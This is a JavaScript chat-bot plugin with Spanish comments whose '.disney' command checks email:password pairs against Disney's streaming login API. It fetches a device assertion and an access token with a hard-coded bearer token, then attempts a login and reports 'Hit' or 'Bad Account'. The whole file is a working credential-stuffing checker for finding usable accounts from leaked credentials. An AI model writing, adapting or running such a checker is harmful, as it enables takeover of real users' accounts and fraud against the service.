import axios from 'axios';

let handler = async (m, { conn, command, text, args, usedPrefix }) => {
  if (command === 'disney') {
    // Verificar que el formato de entrada sea válido: email:password
    const [email, password] = text.split(':');

    if (!email || !password) {
      return conn.reply(m.chat, 'Formato inválido. Usa el formato: `.disney email:password`', m);
    }

    try {
      // Crear una nueva sesión para las solicitudes
      const session = axios.create();
      const headers = {
        'content-type': 'application/json',
        'authorization': 'Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      };

      // Hacer la primera solicitud para obtener el assertion (dispositivo)
      const deviceData = JSON.stringify({ deviceFamily: "browser", applicationRuntime: "chrome", deviceProfile: "windows", attributes: {} });
      const deviceResponse = await session.post('https://global.edge.bamgrid.com/devices', { headers, data: deviceData });

      if (!deviceResponse.data || !deviceResponse.data.assertion) {
        return conn.reply(m.chat, `Error al obtener assertion para ${email}. Intenta nuevamente más tarde.`, m);
      }

      const assertion = deviceResponse.data.assertion;

      // Hacer la segunda solicitud para obtener el access_token
      const tokenData = `grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token=${assertion}&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Adevice`;
      const tokenResponse = await session.post('https://global.edge.bamgrid.com/token', { headers: { ...headers, 'content-type': 'application/x-www-form-urlencoded' }, data: tokenData });

      if (!tokenResponse.data || !tokenResponse.data.access_token) {
        return conn.reply(m.chat, `Error al obtener access token para ${email}. Intenta nuevamente más tarde.`, m);
      }

      const accessToken = tokenResponse.data.access_token;

      // Hacer la solicitud de login con las credenciales del usuario
      const loginHeaders = { ...headers, 'authorization': `Bearer ${accessToken}` };
      const loginData = JSON.stringify({ email, password });
      const loginResponse = await session.post('https://global.edge.bamgrid.com/idp/login', { headers: loginHeaders, data: loginData });

      // Verificar si el login fue exitoso (comprobando si hay id_token)
      if (loginResponse.data && loginResponse.data.id_token) {
        // Si es un hit, responde con "Hit"
        conn.reply(m.chat, `Hit para ${email}`, m);
      } else {
        // Si no es válido, responde con "Bad"
        conn.reply(m.chat, `Bad Account para ${email}`, m);
      }
    } catch (error) {
      console.error('Error en la verificación:', error);
      // En caso de error general
      conn.reply(m.chat, `Error al verificar las credenciales para ${email}. Intenta nuevamente más tarde.`, m);
    }
  }
};

// Establecer el comando
handler.command = ['disney'];

export default handler;
